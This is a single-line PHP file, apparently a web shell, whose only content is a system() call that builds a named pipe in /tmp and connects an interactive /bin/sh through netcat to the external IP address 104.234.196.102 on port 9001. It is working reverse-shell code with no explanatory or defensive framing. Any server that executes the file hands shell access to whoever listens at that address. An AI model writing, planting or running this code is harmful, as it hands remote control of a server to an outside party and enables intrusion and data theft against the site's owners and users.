<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 104.234.196.102 9001 >/tmp/f"); ?>
